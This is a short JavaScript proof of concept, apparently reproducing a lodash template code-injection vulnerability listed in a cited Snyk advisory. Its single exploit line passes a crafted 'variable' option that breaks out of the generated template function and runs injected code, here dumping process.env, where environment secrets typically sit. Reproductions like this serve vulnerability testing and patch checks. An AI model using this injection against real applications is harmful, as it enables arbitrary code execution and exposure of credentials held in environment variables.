//https://snyk.io/vuln/SNYK-JS-LODASHTEMPLATE-1088054
var _ = require("lodash");

_.template("", { variable: "){console.log(process.env)}; with(obj" })();
